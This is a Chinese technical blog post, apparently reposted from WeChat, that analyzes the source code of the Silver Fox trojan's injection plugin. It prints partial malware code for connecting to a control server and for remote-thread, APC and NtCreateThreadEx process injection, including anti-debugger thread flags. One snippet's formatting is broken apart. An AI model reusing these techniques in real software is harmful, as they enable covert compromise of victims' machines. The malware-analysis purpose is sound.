> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/UjPA4k8a3gYmTaqvkXeebw)

> 银狐木马插件源码学习之注入管理
> ===============

源码从其他渠道得到，不确定就是原版，大概率是二开的，学习一下其中的技术点。注入管理插件源码中，dllmain 里面会执行如下的主线程

```
DWORD WINAPI MainThread(LPVOID dllMainThread)
{
    ISocketBase* socketClient;
    if (MyInfo.IsTcp == 1)
        socketClient = new CTcpSocket();
    else
        socketClient = new CUdpSocket();
    if (socketClient->Connect(MyInfo.szAddress, MyInfo.szPort))
    {
        CInjectManager manager(socketClient);
        socketClient->run_event_loop();
    }
    SAFE_DELETE(socketClient);
    if (MyInfo.RunDllEntryProc)
        ExitProcess(0);
    return 0;
}

```

上述代码中，建立 socket 连接后，会传输后续用的插件，用于后续注入。CInjectManager 是银狐注入插件的主要注入类：

```
class CInjectManager : public CManager
{
public:
    BOOL m_buser;
    CInjectManager(ISocketBase* pClient);
    virtual ~CInjectManager();
    virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
private:
    HMEMORYMODULE handle; 
        ....
        ....
private:
    void SendProcessList();
    LPBYTE getProcessList();    //进程
    BOOL DebugPrivilege(const TCHAR* PName, BOOL bEnable);
    BOOL GetProcessUserName(HANDLE hProcess, TCHAR* strProcessUser);
    BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath);
    bool Is64BitPorcess(DWORD dwProcessID);
    bool Is64BitOS();
    void SendError(TCHAR* Terror);
    void CreateLocalRecvFile(LPBYTE lpBuffer);
    void WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize);
    void WriteOk();
    void WriteDllandSetPath(BOOL isx86, TCHAR* lpBuffer);
    TCHAR szPath_dll32[MAX_PATH];
    TCHAR szPath_dll64[MAX_PATH];
    PBYTE RecvDate;
    DWORD offsetsize;       //发生偏移
    BOOL ClientIsx86;
    INJECTMODE m_sinjectmode;
    FILEINFO m_fileinfo;
    BOOL BoxedAppSDK_Init_IsOK;
    BYTE* bxsdkbyte;
    void RunExe(LPBYTE lpBuffer);
    void RunExeuacArg(LPBYTE lpBuffer);
    void DelFile(LPBYTE lpBuffer);
    void Inject_dll();
    void Inject_shellcode();
    DWORD Flags ;
};

```

他这里主要的注入方式有以下几种：

```
enum injectmode
{
    MODE_CreateRemoteThread_dll,
    MODE_CreateRemoteThread_shellcode,
    MODE_QueueUserAPC_dll,
    MODE_QueueUserAPC_shellcode,
    MODE_NtCreateThreadEx_dll,  
    MODE_NtCreateThreadEx_shellcode,
};

```

分别是经典远线程注入，APC 注入还有利用未文档的 NtCreateThreadEx 注入。首先是远线程注入这里, 这里他用了一个开源的项目 Yapi：

```
    case MODE_CreateRemoteThread_dll:
    {
        yapi::YAPICall LoadLibraryA(hProc, _T("kernel32.dll"), "LoadLibraryW");
        if (m_sinjectmode.ExeIsx86)
        {
            DWORD64 x86Dll = LoadLibraryA(m_sinjectmode.WritePath);
        }
        else
        {
            DWORD64 x64Dll = LoadLibraryA.Dw64()(m_sinjectmode.WritePath);
        }
    }

```

该项目除了普通注入外，也支持跨进程架构来注入，wow64->x64。然后是 APC 注入：

```
    case MODE_QueueUserAPC_dll:
    {
           .........
        pNtAllocateVirtualMemory fNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)fpAddresses[0];
        pNtWriteVirtualMemory fNtWriteVirtualMemory = (pNtWriteVirtualMemory)fpAddresses[1];
        pNtSuspendThread fNtSuspendThread = (pNtSuspendThread)fpAddresses[2];
        pNtAlertResumeThread fNtAlertResumeThread = (pNtAlertResumeThread)fpAddresses[3];
        pNtQueueApcThread fNtQueueApcThread = (pNtQueueApcThread)fpAddresses[4];
        HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
        THREADENTRY32 te32;
        hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hThreadSnap == INVALID_HANDLE_VALUE) {
            SendError(_T("无法获取线程快照"));
            break;
        }
        te32.dwSize = sizeof(THREADENTRY32);
        DWORD threadId;
        if (!Thread32First(hThreadSnap, &te32)) {
            SendError(_T("无法获得第一个线程"));
            break;
        }
        do {
            if (te32.th32OwnerProcessID == m_sinjectmode.dwProcessID) {
                                .......
                                .......
                                .......
                    if (fNtSuspendThread)
                    {
                        ULONG SuspendCount = 0;
                        fNtSuspendThread(hThread, &SuspendCount);
                    }
                    DWORD dwResult = fNtQueueApcThread(hThread, (PIO_APC_ROUTINE)LoadLibAddr, pDllPath, NULL, NULL);
                    if (fNtAlertResumeThread)
                    {
                        ULONG SuspendCount = 0;  //apc 被注入的线程，必须是能唤醒的
                        fNtAlertResumeThread(hThread, &SuspendCount);
                    }
                        ......
                        ......
            }
        } while (Thread32Next(hThreadSnap, &te32));
        if (!threadId)
            SendError(_T("没有线程用于进程"));
        CloseHandle(hThreadSnap);
        return;
    }

```

通过创建系统线程快照，查找线程所属进程属于目标的进的线程，

*   首先挂起该线程
    
*   然后调用 NtQueueApcThread 进行注入
    
*   然后调用 NtAlertResumeThread 恢复线程
    
*   最后是 NtCreateThreadEx 这个 API
    

这种注入方式其他部分，如分配内存之类的，和普通的远线程注入没有区别

```
((
pfnNtCreateThreadEx
)
pFunc
)(&
hThread
,
 
0x1FFFFF
,
 NULL
,
 hProc
,
 pCode
,
 pThreadData
,
 
Flags
,
 NULL
,
 NULL
,
 NULL
,
 NULL
);
```

他这里的 flags 值是：

```
    
Flags
 
=
 THREAD_CREATE_FLAGS_CREATE_SUSPENDED 
|
 THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH 
|
 THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
;
```

首先 `THREAD_CREATE_FLAGS_CREATE_SUSPENDED`挂起的线程 第二个 flag `THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH`, 整数类型为 0x2，通过这个 flag 创建的线程，如果是调试器进程中，则不会被调试器附加，如果是 dll 模块的话，dllmain 不会在新的线程中调用。第三个 flag `THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER`，整数类型为 0x4，顾名思义，通过该标志位创建的新线程，调试器永远不会从相应的线程接收任何调试事件，起到反调试效果，在 Ethread 中有一个 HideFromDebugger flag 被置位的话，其实就是这个效果。NtCreateThreadEx 还有其他有意思的地方，比如可以拿来跨会话注入。

**这是一个纯粹，开放，前沿的技术交流社区，成员主要有互联网大厂安全部门任职的成员，乙方红队专家，以及正在学习入门的小白等，社区涉及的领域知识包括但不限于渗透，免杀开发，红蓝对抗，安全建设，考试认证，岗位招聘等等方面，还可以结识很多志同道合的朋友，提升自己的技术栈，开阔视野，提升眼界👇**👇**👇******